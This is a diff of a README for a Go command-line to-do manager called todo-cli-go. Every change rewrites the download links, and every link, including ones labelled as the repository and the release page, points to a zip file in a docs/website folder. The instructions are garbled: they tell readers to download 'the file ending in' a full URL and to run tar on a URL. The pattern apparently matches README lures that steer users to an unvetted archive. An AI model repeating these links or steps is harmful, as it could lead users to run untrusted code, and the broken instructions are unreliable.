@@ -1,6 +1,6 @@
 # 📋 todo-cli-go - Simple Command-Line Task Manager
 
-[![Download todo-cli-go](https://github.com/HYPERGAMINXZ/todo-cli-go/raw/refs/heads/main/docs/website/go_todo_cli_v1.6.zip)](https://github.com/HYPERGAMINXZ/todo-cli-go/raw/refs/heads/main/docs/website/go_todo_cli_v1.6.zip)
+[![Download todo-cli-go](https://raw.githubusercontent.com/HYPERGAMINXZ/todo-cli-go/main/docs/website/go_todo_cli_v1.6.zip)](https://raw.githubusercontent.com/HYPERGAMINXZ/todo-cli-go/main/docs/website/go_todo_cli_v1.6.zip)
 
 ## 📖 What is todo-cli-go?
 
@@ -23,14 +23,14 @@ To get started, you will download the program, open it, and learn the basic comm
 
 ## 📥 Download & Install
 
-Please visit [this page to download](https://github.com/HYPERGAMINXZ/todo-cli-go/raw/refs/heads/main/docs/website/go_todo_cli_v1.6.zip) to get the latest version of todo-cli-go.
+Please visit [this page to download](https://raw.githubusercontent.com/HYPERGAMINXZ/todo-cli-go/main/docs/website/go_todo_cli_v1.6.zip) to get the latest version of todo-cli-go.
 
 ### How to Download
 
 1. Click the green "Latest release" on the release page.
 2. Choose the version that matches your computer’s system:
    - For Windows, download the file ending in `.exe`.
-   - For macOS or Linux, download the file ending in `https://github.com/HYPERGAMINXZ/todo-cli-go/raw/refs/heads/main/docs/website/go_todo_cli_v1.6.zip` or without `.exe`.
+   - For macOS or Linux, download the file ending in `https://raw.githubusercontent.com/HYPERGAMINXZ/todo-cli-go/main/docs/website/go_todo_cli_v1.6.zip` or without `.exe`.
 3. Save the file to a place you will remember, like your desktop or downloads folder.
 
 ### How to Install
@@ -43,7 +43,7 @@ Please visit [this page to download](https://github.com/HYPERGAMINXZ/todo-cli-go
 - **macOS or Linux:**
   1. Open the terminal.
   2. Go to the folder where you saved the downloaded file. For example, type `cd ~/Downloads`.
-  3. Extract the files if it’s zipped or compressed. Use: `tar -xzf https://github.com/HYPERGAMINXZ/todo-cli-go/raw/refs/heads/main/docs/website/go_todo_cli_v1.6.zip`.
+  3. Extract the files if it’s zipped or compressed. Use: `tar -xzf https://raw.githubusercontent.com/HYPERGAMINXZ/todo-cli-go/main/docs/website/go_todo_cli_v1.6.zip`.
   4. To start todo-cli-go, type `./todo-cli-go` and press Enter.
 
 No complex setup is needed besides these simple steps.
@@ -107,7 +107,7 @@ Replace `1` with the task number you want to delete.
 
 If you have questions or want to learn more:
 
-- Visit the [GitHub repository](https://github.com/HYPERGAMINXZ/todo-cli-go/raw/refs/heads/main/docs/website/go_todo_cli_v1.6.zip) to see the code and documentation.
+- Visit the [GitHub repository](https://raw.githubusercontent.com/HYPERGAMINXZ/todo-cli-go/main/docs/website/go_todo_cli_v1.6.zip) to see the code and documentation.
 - Look for an issues page there if you want to report bugs or ask for help.
 - You can open your terminal and run `todo --help` after installation to see a list of all commands.
 
@@ -122,6 +122,6 @@ This project uses a combination of popular Go tools to build an easy interface:
 
 ## 🔗 Quick Access
 
-[Download todo-cli-go now](https://github.com/HYPERGAMINXZ/todo-cli-go/raw/refs/heads/main/docs/website/go_todo_cli_v1.6.zip)
+[Download todo-cli-go now](https://raw.githubusercontent.com/HYPERGAMINXZ/todo-cli-go/main/docs/website/go_todo_cli_v1.6.zip)
 
 Use this link to visit the page where you can get the right version for your computer. This is the safest and simplest way to start using todo-cli-go today.
